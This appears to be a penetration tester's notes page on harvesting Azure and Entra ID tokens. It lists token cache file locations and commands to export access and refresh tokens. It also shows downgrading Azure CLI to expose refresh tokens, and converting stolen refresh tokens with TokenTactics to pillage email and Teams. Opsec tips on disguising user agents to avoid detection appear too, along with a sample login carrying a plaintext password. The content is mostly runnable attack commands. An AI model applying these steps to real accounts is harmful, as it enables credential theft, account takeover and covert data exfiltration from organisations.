
### Token locations

> [!NOTE] Note
> In non-windows devices, azure tokens are stored in plaintext

**Linux & Mac** (might have resource token in plaintext)

```bash
~./azure/msal_token_cache.json
~./Azure/msal_token_cache.json
```

**Windows** (can export access token, but refresh token is encrypted)


```
C:\Users\user1\.Azure\accessTokens.json
C:\Users\user1\.azure\msal_token_cache.bin
C:\Users\user1\.Azure\TokensCache.dat
C:\Users\user1\AppData\Local\.IdentityService\msal.cache
```

**Save tokens for later use:**
- (if token protection is not enables, we can just move the session to our own device)
```powershell
Save-AzContext
```


We can use Export-AzureCliTokens / Export-AADIntAzureCliTokens function in AccessToken_utils.ps1 from AADInternals-Endpoints.

```powershell
git clone https://github.com/Gerenios/AADInternals-Endpoints; cd AADInternals-Endpoints
Import-Module .\AADInternals-Endpoints.psm1
Import-Module .\CommonUtils.ps1
Import-Module .\AccessToken_utils.ps1
```

the refresh tokens seem not to be stored in the MSALCache. If you add Write-Output $tokens just before $objTokens = $tokens | ConvertFrom-Json in the function Export-AzureCliTokens in AccessToken_utils.ps1, we see all the AccessToken and IdToken values but no RefreshToken values

> [!NOTE] Note
> We can actually access the tokens if we install an older version o the azure cli

```powershell
winget uninstall Microsoft.AzureCLI --all-versions

Invoke-WebRequest -Uri https://azurecliprod.blob.core.windows.net/msi/azure-cli-2.3.0.msi -OutFile .\AzureCLI.msi; Start-Process msiexec.exe -Wait -ArgumentList '/I AzureCLI.msi /quiet'; rm .\AzureCLI.msi
```

Then we login again and see the readable tokens

### Get access tokens

azure CLI
```bash
az account get-access-token
az account get-access-token --resource "https://vault.azure.net"
```

powershell
```powershell
(Get-AzAccessToken -ResourceUrl "https://vault.azure.net").Token
(Get-AzAccessToken -ResourceUrl "https://graph.microsoft.com").Token
```

**Get token with specific audience**

Entra ID:
```bash
az account get-access-token --resource-type ms-graph
```

Azure:
```bash
az account get-access-token --resource-type arm
```


### Got a refresh token?

```powershell
# We can clone it e.g. If we want to easily make changes to the source code
git clone https://github.com/Gerenios/AADInternals-Endpoints; cd AADInternals-Endpoints
Import-Module .\AADInternals-Endpoints.psm1
Import-Module .\CommonUtils.ps1
Import-Module .\AccessToken_utils.ps1
```

```powershell
Export-AzureCliTokens | fl
```
#### Convert to graph token and pillage

Convert: **TokenTactics**
https://github.com/f-bader/TokenTacticsV2
```powershell
. .\TokenTactics.psm1
RefreshTo-MSGraphToken -domain domain.com -RefreshToken '<1.....>'
```
Write tokens to `$MSGraphToken` access: `$MSGraphToken.access_token`


**Pillage email:** [[Cloud/data_pillaging#Email|data_pillaging]]

#### Convert to MSTeams token and pillage

Convert: **TokenTactics**
https://github.com/f-bader/TokenTacticsV2
```powershell
Import-Module ./TokenTactics.psm1
RefreshTo-MSTeamsToken -domain domain.com -RefreshToken '<1.....>'
```
Write tokens to `$MSGraphToken` access: `$MSGraphToken.access_token`

**Pillage MSTeams:** [[Cloud/data_pillaging#MSTeams|data_pillaging]]

> [!NOTE] Opsec
> TokenTactics uses hyper specific user agents and should be modified for stealth

> [!NOTE] Opsec
> TokenTactics will let you pass `-Device` or `-Browser` to better blend in

### Get tokens from valid auth.

**ROADTools**
https://github.com/dirkjanm/ROADtools
```bash
roadrecon auth -u "Lindsey.Miller@megabigtech.com" -p 'SUmmer07!!'
```

**GraphRunner**
https://github.com/dafthack/GraphRunner/
```powershell
. .\GraphRunner.ps1
Get-GraphTokens -UserPasswordAuth
```
Also, use refresh token to grab new access tokens
```powershell
Invoke-RefreshGraphTokens
```